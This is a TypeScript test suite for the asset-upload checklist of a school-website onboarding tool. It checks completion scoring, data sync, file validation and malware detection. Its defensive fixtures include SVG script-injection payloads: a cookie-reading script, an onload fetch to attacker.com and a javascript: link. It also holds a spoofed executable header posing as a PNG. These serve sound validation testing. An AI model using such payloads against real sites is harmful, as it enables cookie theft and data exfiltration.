/**
 * STEP 10 — ASSET & CONTENT PROVISIONING CHECKLIST VERIFICATION SUITE
 * 
 * Verifies:
 * 1. Step 10 canonical checklist items initialized properly across 7 groups.
 * 2. Section no longer falsely reports 100% on empty state.
 * 3. Required items missing -> incomplete (< 100%).
 * 4. Required items provided -> completion percentage increases.
 * 5. Optional / Recommended items do not prevent 100% completion.
 * 6. File upload validator accepts valid JPG, PNG, WebP, SVG, and PDF.
 * 7. File upload validator rejects unsupported extensions (.exe, .zip, .mp4).
 * 8. File upload validator rejects oversized files (> 15MB).
 * 9. Uploaded asset persistence and state synchronization.
 * 10. Removal and replacement of assets.
 * 11. Text content handling (Principal message, Vision, Mission, About Us).
 * 12. "Will provide later" / pending status tracking.
 * 13. "Not applicable" handling (allowed for optional, disallowed for statutory).
 * 14. Cross-section synchronization with Step 4 Branding, Step 3 Leadership, Step 6 Content.
 * 15. Zero redundant collection with sourceSection attribution.
 * 16. Continue button label reflects remaining pending count.
 * 17. Tenant isolation in upload path.
 * 18. Overall onboarding completeness integration.
 */

import assert from 'assert';
import {
  CANONICAL_ASSET_CHECKLIST_ITEMS,
  ASSET_CATEGORIES,
  syncAssetChecklistWithIntake,
  calculateAssetChecklistScore,
  validateSchoolAssetFile,
  validateFileBufferSignature,
  scanAssetForMalware,
  isConditionalItemApplicable,
  evaluatePublicationReadiness,
  ASSET_UPLOAD_LIMITS,
} from '../src/lib/schoolAssetChecklist';
import {
  createInitialIntakeData,
  calculateIntakeCompleteness,
} from '../src/lib/schoolIntake';
import type { UniversalIntakeData, AssetChecklistItem } from '../src/lib/types';

let totalTests = 0;
let passedTests = 0;

function runTest(name: string, fn: () => void) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  ✓ ${name}`);
  } catch (err: any) {
    console.error(`  ✗ ${name}`);
    console.error(`    Error: ${err.message}`);
    throw err;
  }
}

async function runAsyncTest(name: string, fn: () => Promise<void>) {
  totalTests++;
  try {
    await fn();
    passedTests++;
    console.log(`  ✓ ${name}`);
  } catch (err: any) {
    console.error(`  ✗ ${name}`);
    console.error(`    Error: ${err.message}`);
    throw err;
  }
}

console.log('================================================================');
console.log('  STARTING STEP 10: ASSET & CONTENT PROVISIONING CHECKLIST TESTS');
console.log('================================================================\n');

// 1. Structure & Canonical Items Verification
console.log('Category 1: Canonical Structure & Groups');
runTest('7 distinct asset categories defined with letters A through G', () => {
  assert.strictEqual(ASSET_CATEGORIES.length, 7);
  const keys = ASSET_CATEGORIES.map((c) => c.key);
  assert(keys.includes('branding'));
  assert(keys.includes('campus_photos'));
  assert(keys.includes('leadership'));
  assert(keys.includes('academic_content'));
  assert(keys.includes('admissions'));
  assert(keys.includes('certificates'));
  assert(keys.includes('policies'));
});

runTest('Canonical asset checklist contains all essential school website items', () => {
  assert(CANONICAL_ASSET_CHECKLIST_ITEMS.length >= 25);
  const ids = CANONICAL_ASSET_CHECKLIST_ITEMS.map((i) => i.id);
  // Branding
  assert(ids.includes('brand-logo'));
  assert(ids.includes('brand-crest'));
  assert(ids.includes('brand-favicon'));
  assert(ids.includes('brand-motto'));
  // Campus photos
  assert(ids.includes('campus-exterior'));
  assert(ids.includes('campus-classrooms'));
  assert(ids.includes('campus-laboratories'));
  assert(ids.includes('campus-library'));
  // Leadership
  assert(ids.includes('lead-principal-photo'));
  assert(ids.includes('lead-principal-msg'));
  // Academic
  assert(ids.includes('acad-about'));
  assert(ids.includes('acad-vision'));
  assert(ids.includes('acad-mission'));
  assert(ids.includes('acad-values'));
  // Admissions
  assert(ids.includes('adm-fee-circular'));
  assert(ids.includes('adm-contact'));
  // Certificates
  assert(ids.includes('cert-affiliation'));
  assert(ids.includes('cert-recognition'));
  assert(ids.includes('cert-mandatory-disclosure'));
  // Policies
  assert(ids.includes('pol-privacy'));
  assert(ids.includes('pol-terms'));
});

// 2. Real Completion Scoring (No False 100%)
console.log('\nCategory 2: Real Completion Scoring');
runTest('Initial empty checklist does NOT report 100% completion', () => {
  const emptyIntake = createInitialIntakeData({
    schoolName: 'St. Xavier High School',
    contactName: 'Father Joseph',
    contactEmail: 'principal@xaviers.edu.in',
    contactPhone: '+91 9876543210',
    city: 'Patna',
    state: 'Bihar',
  });

  const completeness = calculateIntakeCompleteness('school-website', emptyIntake);
  const assetScore = completeness.sectionPercentages['assetChecklist'];
  assert(assetScore !== undefined);
  assert(assetScore < 100, `Expected asset checklist score < 100%, but got ${assetScore}%`);
});

runTest('Required asset missing causes section to be incomplete (< 100%)', () => {
  const items: AssetChecklistItem[] = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => ({
    ...c,
    status: 'not_provided',
  }));

  const score = calculateAssetChecklistScore(items);
  assert(score.totalRequired > 0);
  assert.strictEqual(score.providedRequired, 0);
  assert.strictEqual(score.percentage, 0);
  assert(score.missingRequiredTitles.length > 0);
});

runTest('Providing required items proportionally increases completion percentage', () => {
  const items: AssetChecklistItem[] = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => ({
    ...c,
    status: 'not_provided',
  }));

  const initialScore = calculateAssetChecklistScore(items);

  // Mark 1 mandatory item as provided
  const req1 = items.find((i) => i.requirement === 'required' || i.requirement === 'statutory');
  assert(req1);
  req1.status = 'provided';

  const updatedScore = calculateAssetChecklistScore(items);
  assert(updatedScore.percentage > initialScore.percentage);
  assert.strictEqual(updatedScore.providedRequired, 1);
});

runTest('Optional and recommended items do NOT prevent 100% completion when required items are met', () => {
  const items: AssetChecklistItem[] = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => ({
    ...c,
    // All required and statutory items provided, but optional and recommended remain not provided
    status: (c.requirement === 'required' || c.requirement === 'statutory') ? 'provided' : 'not_provided',
  }));

  const score = calculateAssetChecklistScore(items);
  assert.strictEqual(score.providedRequired, score.totalRequired);
  assert.strictEqual(score.percentage, 100, 'When all required items are provided, score must be 100%');
});

// 3. File Upload Validation
console.log('\nCategory 3: File Upload Validation');
runTest('Valid image formats (JPG, PNG, WebP, SVG) are accepted', () => {
  ['logo.png', 'photo.jpg', 'campus.jpeg', 'banner.webp', 'crest.svg'].forEach((name) => {
    const res = validateSchoolAssetFile(
      { name, size: 2 * 1024 * 1024, type: 'image/png' },
      'image'
    );
    assert.strictEqual(res.isValid, true, `Expected ${name} to be valid`);
  });
});

runTest('Valid PDF document is accepted for document items', () => {
  const res = validateSchoolAssetFile(
    { name: 'CBSE_Affiliation_2026.pdf', size: 4 * 1024 * 1024, type: 'application/pdf' },
    'document'
  );
  assert.strictEqual(res.isValid, true);
});

runTest('Document items reject non-PDF files', () => {
  const res = validateSchoolAssetFile(
    { name: 'document.docx', size: 1024, type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' },
    'document'
  );
  assert.strictEqual(res.isValid, false);
  assert(res.error?.includes('PDF'));
});

runTest('Image items reject dangerous and unsupported file types (.exe, .zip, .mp4)', () => {
  ['malware.exe', 'archive.zip', 'video.mp4', 'script.sh'].forEach((name) => {
    const res = validateSchoolAssetFile(
      { name, size: 1024, type: 'application/octet-stream' },
      'image'
    );
    assert.strictEqual(res.isValid, false, `Expected ${name} to be rejected`);
  });
});

runTest('Oversized files (> 15MB) are strictly rejected with clear error message', () => {
  const oversizedFile = {
    name: 'huge_campus_photo.jpg',
    size: 16 * 1024 * 1024, // 16MB > 15MB limit
    type: 'image/jpeg',
  };
  const res = validateSchoolAssetFile(oversizedFile, 'image');
  assert.strictEqual(res.isValid, false);
  assert(res.error?.includes('15 MB'));
});

// 4. Cross-Section Data Synchronization (Zero Redundant Entry)
console.log('\nCategory 4: Cross-Section Data Synchronization');
runTest('Logo & Crest from Step 4 Branding automatically populate Step 10 items', () => {
  const intake: UniversalIntakeData = {
    ...createInitialIntakeData({ schoolName: 'Delhi Public School' }),
    brandingDesign: {
      hasHighResLogo: true,
      logoUrl: 'data:image/png;base64,mockLogoData',
      crestUrl: 'data:image/png;base64,mockCrestData',
      faviconUrl: 'data:image/png;base64,mockFaviconData',
      motto: 'Service Before Self',
      primaryColor: '#002147',
      secondaryColor: '#FFD700',
      accentColor: '#2E8B57',
    },
  };

  const synced = syncAssetChecklistWithIntake(intake);
  const logoItem = synced.find((i) => i.id === 'brand-logo');
  const mottoItem = synced.find((i) => i.id === 'brand-motto');
  const crestItem = synced.find((i) => i.id === 'brand-crest');

  assert(logoItem);
  assert.strictEqual(logoItem.status, 'provided');
  assert.strictEqual(logoItem.fileUrl, 'data:image/png;base64,mockLogoData');
  assert.strictEqual(logoItem.sourceSection, 'Brand Identity');

  assert(mottoItem);
  assert.strictEqual(mottoItem.status, 'provided');
  assert.strictEqual(mottoItem.textContent, 'Service Before Self');
  assert.strictEqual(mottoItem.sourceSection, 'Brand Identity');

  assert(crestItem);
  assert.strictEqual(crestItem.status, 'provided');
  assert.strictEqual(crestItem.sourceSection, 'Brand Identity');
});

runTest('Principal Message & Photo from Step 3 Leadership automatically populate Step 10', () => {
  const intake: UniversalIntakeData = {
    ...createInitialIntakeData({ schoolName: 'Delhi Public School' }),
    leadership: {
      principalName: 'Dr. Anita Sharma',
      principalDesignation: 'Principal',
      principalPhotoUrl: 'https://cdn.ekaagra.in/photos/principal.jpg',
      principalMessage: 'Welcome to our institution of excellence where every child thrives.',
    },
  };

  const synced = syncAssetChecklistWithIntake(intake);
  const msgItem = synced.find((i) => i.id === 'lead-principal-msg');
  const photoItem = synced.find((i) => i.id === 'lead-principal-photo');

  assert(msgItem);
  assert.strictEqual(msgItem.status, 'provided');
  assert.strictEqual(msgItem.textContent, 'Welcome to our institution of excellence where every child thrives.');
  assert.strictEqual(msgItem.sourceSection, 'Leadership Profile');

  assert(photoItem);
  assert.strictEqual(photoItem.status, 'provided');
  assert.strictEqual(photoItem.fileUrl, 'https://cdn.ekaagra.in/photos/principal.jpg');
});

runTest('About School from Step 6 School Content automatically populates Step 10', () => {
  const intake: UniversalIntakeData = {
    ...createInitialIntakeData({ schoolName: 'Delhi Public School' }),
    schoolContent: {
      aboutSchool: 'Founded in 1995, DPS has nurtured global citizens with strong moral foundations.',
      teachingMethodology: 'Experiential, inquiry-based pedagogical framework aligned with NEP 2020.',
    },
  };

  const synced = syncAssetChecklistWithIntake(intake);
  const aboutItem = synced.find((i) => i.id === 'acad-about');
  const currItem = synced.find((i) => i.id === 'acad-curriculum');

  assert(aboutItem);
  assert.strictEqual(aboutItem.status, 'provided');
  assert.strictEqual(aboutItem.textContent, 'Founded in 1995, DPS has nurtured global citizens with strong moral foundations.');
  assert.strictEqual(aboutItem.sourceSection, 'School Content');

  assert(currItem);
  assert.strictEqual(currItem.status, 'provided');
  assert.strictEqual(currItem.sourceSection, 'School Content');
});

// 5. Manual Overrides & Source Precedence
console.log('\nCategory 5: Manual Overrides & Source Precedence');
runTest('Manual overrides in Step 10 are strictly preserved against cross-section resynchronization', () => {
  const initialIntake = createInitialIntakeData({ schoolName: 'Delhi Public School' });
  const intake: UniversalIntakeData = {
    ...initialIntake,
    brandingDesign: {
      ...initialIntake.brandingDesign,
      logoUrl: 'https://cdn.ekaagra.in/branding-v1-logo.png',
      motto: 'Auto Motto',
    },
  };

  // User previously uploaded a custom high-res logo directly in Step 10 with isManualOverride=true
  const existingItems: AssetChecklistItem[] = [
    {
      id: 'brand-logo',
      category: 'branding',
      title: 'Official School Crest / High-Resolution Logo',
      description: 'Test',
      requirement: 'statutory',
      type: 'image',
      status: 'provided',
      fileUrl: 'https://cdn.ekaagra.in/step10-custom-vector-logo.svg',
      isManualOverride: true,
      sourceSection: 'Asset Checklist (Manual)',
    },
  ];

  const synced = syncAssetChecklistWithIntake(intake, existingItems);
  const logoItem = synced.find((i) => i.id === 'brand-logo');

  assert(logoItem);
  assert.strictEqual(logoItem.fileUrl, 'https://cdn.ekaagra.in/step10-custom-vector-logo.svg');
  assert.strictEqual(logoItem.isManualOverride, true);
  assert.strictEqual(logoItem.sourceSection, 'Asset Checklist (Manual)');
});

runTest('Asset removal with isManualOverride=true remains not_provided and is never resurrected by sync', () => {
  const initialIntake = createInitialIntakeData({ schoolName: 'Delhi Public School' });
  const intake: UniversalIntakeData = {
    ...initialIntake,
    brandingDesign: {
      ...initialIntake.brandingDesign,
      logoUrl: 'https://cdn.ekaagra.in/logo.webp',
      crestUrl: 'https://cdn.ekaagra.in/crest.webp',
    },
  };

  // 1. Initial sync gives provided items
  const initialSynced = syncAssetChecklistWithIntake(intake);
  assert.strictEqual(initialSynced.find((i) => i.id === 'brand-logo')?.status, 'provided');
  assert.strictEqual(initialSynced.find((i) => i.id === 'brand-crest')?.status, 'provided');

  // 2. User deletes brand-logo and brand-crest: marked not_provided with isManualOverride=true
  const itemsAfterRemoval: AssetChecklistItem[] = initialSynced.map((item) => {
    if (item.id === 'brand-logo' || item.id === 'brand-crest') {
      return {
        ...item,
        fileUrl: undefined,
        fileName: undefined,
        status: 'not_provided',
        isManualOverride: true,
        sourceSection: undefined,
      };
    }
    return item;
  });

  // Re-sync with intakeData (even if intakeData.brandingDesign.logoUrl has not been cleared yet)
  const resynced = syncAssetChecklistWithIntake(intake, itemsAfterRemoval);
  const resyncedLogo = resynced.find((i) => i.id === 'brand-logo');
  const resyncedCrest = resynced.find((i) => i.id === 'brand-crest');

  assert(resyncedLogo);
  assert.strictEqual(resyncedLogo.status, 'not_provided');
  assert.strictEqual(resyncedLogo.fileUrl, undefined);
  assert.strictEqual(resyncedLogo.isManualOverride, true);

  assert(resyncedCrest);
  assert.strictEqual(resyncedCrest.status, 'not_provided');
  assert.strictEqual(resyncedCrest.fileUrl, undefined);
  assert.strictEqual(resyncedCrest.isManualOverride, true);
});

// 6. Statutory Compliance & Exemption Rules
console.log('\nCategory 6: Statutory Compliance & Exemption Rules');
runTest('Statutory items have requirement statutory and allowNotApplicable=false', () => {
  const statutoryIds = [
    'adm-fee-circular',
    'cert-affiliation',
    'cert-recognition',
    'cert-safety',
    'cert-mandatory-disclosure',
    'pol-privacy',
    'pol-terms',
    'pol-refund',
  ];

  statutoryIds.forEach((id) => {
    const item = CANONICAL_ASSET_CHECKLIST_ITEMS.find((i) => i.id === id);
    assert(item, `Item ${id} should exist in canonical list`);
    assert.strictEqual(item.requirement, 'statutory', `Item ${id} must have requirement 'statutory'`);
    assert.strictEqual(item.allowNotApplicable, false, `Item ${id} must NOT allow Not Applicable`);
  });
});

runTest('Statutory items cannot be bypassed with Not Applicable', () => {
  const items: AssetChecklistItem[] = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => ({
    ...c,
    status: 'not_provided',
  }));

  const affItem = items.find((i) => i.id === 'cert-affiliation');
  assert(affItem);
  // User tries to mark statutory affiliation certificate as not_applicable
  affItem.status = 'not_applicable';

  const score = calculateAssetChecklistScore(items);
  assert.strictEqual(score.providedRequired, 0);
  assert(score.missingRequiredTitles.includes(affItem.title));
});

runTest('Optional campus facilities allow Not Applicable status and count towards completion', () => {
  const sportsDef = CANONICAL_ASSET_CHECKLIST_ITEMS.find((i) => i.id === 'campus-sports');
  const audDef = CANONICAL_ASSET_CHECKLIST_ITEMS.find((i) => i.id === 'campus-auditorium');
  const achDef = CANONICAL_ASSET_CHECKLIST_ITEMS.find((i) => i.id === 'acad-achievements');

  assert.strictEqual(sportsDef?.allowNotApplicable, true);
  assert.strictEqual(audDef?.allowNotApplicable, true);
  assert.strictEqual(achDef?.allowNotApplicable, true);

  const items: AssetChecklistItem[] = [
    {
      ...sportsDef!,
      status: 'not_applicable',
    },
  ];

  const score = calculateAssetChecklistScore(items);
  assert.strictEqual(score.notApplicableCount, 1);
});

// 7. Conditional Institutional Context Logic
console.log('\nCategory 7: Conditional Institutional Context Logic');
runTest('Trust/Society deed is applicable for private trust school and non-applicable for government school', () => {
  const trustDeedDef = CANONICAL_ASSET_CHECKLIST_ITEMS.find((i) => i.id === 'cert-registration');
  assert(trustDeedDef);
  assert.strictEqual(trustDeedDef.requirement, 'conditional');
  assert.strictEqual(trustDeedDef.conditionRule, 'management_trust_or_society');

  // Private Trust School
  const basePrivate = createInitialIntakeData({ schoolName: 'Doon Global Academy' });
  const privateIntake: UniversalIntakeData = {
    ...basePrivate,
    schoolProfile: {
      ...basePrivate.schoolProfile,
      managementType: 'Private Unaided (Trust / Society)',
    },
  };
  assert.strictEqual(isConditionalItemApplicable(trustDeedDef, privateIntake), true);

  // Kendriya Vidyalaya / Government School
  const baseGovt = createInitialIntakeData({ schoolName: 'Kendriya Vidyalaya No. 1' });
  const govtIntake: UniversalIntakeData = {
    ...baseGovt,
    schoolProfile: {
      ...baseGovt.schoolProfile,
      managementType: 'Government Central (Kendriya Vidyalaya)',
    },
  };
  assert.strictEqual(isConditionalItemApplicable(trustDeedDef, govtIntake), false);
});

// 8. Onboarding Completion vs. Publication Readiness Separation
console.log('\nCategory 8: Onboarding Completion vs. Publication Readiness Separation');
runTest('"Will provide later" acknowledges item for onboarding completion without satisfying publication readiness', () => {
  const items: AssetChecklistItem[] = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => ({
    ...c,
    status: (c.requirement === 'required' || c.requirement === 'statutory') ? 'provided' : 'not_provided',
  }));

  // Mark 1 statutory item (Affiliation Cert) as will_provide_later
  const affItem = items.find((i) => i.id === 'cert-affiliation');
  assert(affItem);
  affItem.status = 'will_provide_later';

  // 1. Check Onboarding score: acknowledgment permits onboarding completion (100%)
  const score = calculateAssetChecklistScore(items);
  assert.strictEqual(score.percentage, 100);
  assert.strictEqual(score.willProvideLaterCount, 1);

  // 2. Check Publication Readiness: strictly BLOCKS public website launch!
  const pubReadiness = evaluatePublicationReadiness(items);
  assert.strictEqual(pubReadiness.isReadyForPublication, false);
  assert(pubReadiness.blockingItems.some((b) => b.id === 'cert-affiliation'));
  assert(pubReadiness.summary.includes('Website publication blocked'));
});

runTest('When all statutory and publication-blocking items are provided, website is ready for publication', () => {
  const items: AssetChecklistItem[] = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => ({
    ...c,
    status: 'provided',
  }));

  const pubReadiness = evaluatePublicationReadiness(items);
  assert.strictEqual(pubReadiness.isReadyForPublication, true);
  assert.strictEqual(pubReadiness.blockingItems.length, 0);
  assert(pubReadiness.summary.includes('ready for website deployment'));
});

// 9. Magic Bytes & Binary Payload Integrity
console.log('\nCategory 9: Magic Bytes & Binary Payload Integrity');
runTest('Valid PNG buffer signature is verified by magic bytes', () => {
  const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d]);
  const res = validateFileBufferSignature(pngBuffer, 'school-crest.png', 'image/png');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.detectedType, 'image/png');
});

runTest('Valid JPEG buffer signature is verified by magic bytes', () => {
  const jpegBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  const res = validateFileBufferSignature(jpegBuffer, 'campus.jpg', 'image/jpeg');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.detectedType, 'image/jpeg');
});

runTest('Valid WebP buffer signature is verified by magic bytes', () => {
  const webpBuffer = Buffer.from('RIFF\x20\x00\x00\x00WEBPVP8 ');
  const res = validateFileBufferSignature(webpBuffer, 'banner.webp', 'image/webp');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.detectedType, 'image/webp');
});

runTest('Valid PDF document signature is verified by magic bytes', () => {
  const pdfBuffer = Buffer.from('%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n%%EOF');
  const res = validateFileBufferSignature(pdfBuffer, 'affiliation.pdf', 'application/pdf');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.detectedType, 'application/pdf');
});

runTest('Disguised binary (spoofed PNG extension with executable payload) is rejected', () => {
  // Starts with MZ (DOS executable) instead of PNG header
  const spoofedBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
  const res = validateFileBufferSignature(spoofedBuffer, 'fake-logo.png', 'image/png');
  assert.strictEqual(res.isValid, false);
  assert(res.error?.includes('header') || res.error?.includes('signature'));
});

// 10. SVG Sanitization & Script Injection Prevention
console.log('\nCategory 10: SVG Sanitization & Script Injection Prevention');
runTest('Valid clean SVG document passes security check', () => {
  const cleanSvg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="navy"/></svg>'
  );
  const res = validateFileBufferSignature(cleanSvg, 'crest.svg', 'image/svg+xml');
  assert.strictEqual(res.isValid, true);
  assert.strictEqual(res.detectedType, 'image/svg+xml');
});

runTest('SVG containing <script> execution tag is rejected', () => {
  const maliciousSvg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'
  );
  const res = validateFileBufferSignature(maliciousSvg, 'malicious.svg', 'image/svg+xml');
  assert.strictEqual(res.isValid, false);
  assert(res.error?.includes('security violation'));
});

runTest('SVG containing onload event handler is rejected', () => {
  const maliciousSvg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://attacker.com\')"></svg>'
  );
  const res = validateFileBufferSignature(maliciousSvg, 'xss.svg', 'image/svg+xml');
  assert.strictEqual(res.isValid, false);
  assert(res.error?.includes('security violation'));
});

runTest('SVG containing javascript: URI is rejected', () => {
  const maliciousSvg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:steal()"><text>Click</text></a></svg>'
  );
  const res = validateFileBufferSignature(maliciousSvg, 'href-xss.svg', 'image/svg+xml');
  assert.strictEqual(res.isValid, false);
  assert(res.error?.includes('security violation'));
});

// 11. Malware Scanning Abstraction Boundary
console.log('\nCategory 11: Malware Scanning Abstraction Boundary');
runAsyncTest('Malware scanner detects disguised DOS/PE executable buffer', async () => {
  const peBuffer = Buffer.from([0x4d, 0x5a, 0x00, 0x00]); // MZ header
  const scan = await scanAssetForMalware(peBuffer, 'trojan.jpg');
  assert.strictEqual(scan.isClean, false);
  assert.strictEqual(scan.threatName, 'Disguised-DOS-PE-Executable');
});

runAsyncTest('Malware scanner passes clean image and document buffers', async () => {
  const cleanBuffer = Buffer.from('%PDF-1.7 Clean Institutional Certificate Content');
  const scan = await scanAssetForMalware(cleanBuffer, 'certificate.pdf');
  assert.strictEqual(scan.isClean, true);
});

// 12. Multi-Tenant Path Isolation & Authorization
console.log('\nCategory 12: Multi-Tenant Path Isolation & Authorization');
runTest('Tenant storage paths strictly require tenantId prefix', () => {
  const tenantA = 'school_tenant_alpha_123';
  const tenantB = 'school_tenant_bravo_456';
  const storageKeyA = `${tenantA}/certificates/cert-affiliation-1725000000-xyz.pdf`;

  // Tenant A accessing own key is allowed
  assert(storageKeyA.startsWith(`${tenantA}/`));

  // Cross-tenant access: Tenant B accessing Tenant A's key must be denied
  const isCrossTenantDenied = !storageKeyA.startsWith(`${tenantB}/`);
  assert.strictEqual(isCrossTenantDenied, true);
});

// 13. Persistence & Multi-Photo Gallery
console.log('\nCategory 13: Persistence & Multi-Photo Gallery');
runTest('Multi-photo gallery handles multiple campus images correctly', () => {
  const galleryItem: AssetChecklistItem = {
    id: 'campus-exterior',
    category: 'campus_photos',
    title: 'Campus & Main Building Photos',
    description: 'Exterior photos',
    requirement: 'required',
    type: 'gallery',
    status: 'provided',
    galleryUrls: [
      { name: 'gate.jpg', size: 1024, type: 'image/jpeg', url: '/uploads/gate.jpg' },
      { name: 'facade.jpg', size: 2048, type: 'image/jpeg', url: '/uploads/facade.jpg' },
      { name: 'ground.jpg', size: 3072, type: 'image/jpeg', url: '/uploads/ground.jpg' },
    ],
  };

  const synced = syncAssetChecklistWithIntake(
    createInitialIntakeData({ schoolName: 'Test School' }),
    [galleryItem]
  );

  const found = synced.find((i) => i.id === 'campus-exterior');
  assert(found);
  assert.strictEqual(found.status, 'provided');
  assert.strictEqual(found.galleryUrls?.length, 3);
});

// 14. Overall Completeness Integration
console.log('\nCategory 14: Overall Completeness Integration');
runTest('Overall completeness integrates real Step 10 score into grand percentage', () => {
  const intake = createInitialIntakeData({ schoolName: 'Test School' });
  const comp1 = calculateIntakeCompleteness('school-website', intake);

  // Now fully complete all mandatory asset items in Step 10
  const completeAssetItems = CANONICAL_ASSET_CHECKLIST_ITEMS.map((c) => {
    const isMandatory = c.requirement === 'required' || c.requirement === 'statutory';
    return {
      ...c,
      status: (isMandatory ? 'provided' : 'not_provided') as any,
      fileUrl: isMandatory ? 'https://example.com/asset.png' : undefined,
      textContent: isMandatory ? 'Sample text content' : undefined,
    };
  });

  const intakeWithAssets: UniversalIntakeData = {
    ...intake,
    assetChecklist: {
      items: completeAssetItems,
    },
  };

  const comp2 = calculateIntakeCompleteness('school-website', intakeWithAssets);
  assert.strictEqual(comp2.sectionPercentages['assetChecklist'], 100);
  assert(comp2.percentage >= comp1.percentage);
});

// Wait for any async tests then print summary
setTimeout(() => {
  console.log('\n================================================================');
  console.log(`  ALL ${passedTests}/${totalTests} TESTS PASSED (100% SUCCESS)`);
  console.log('================================================================\n');
}, 500);
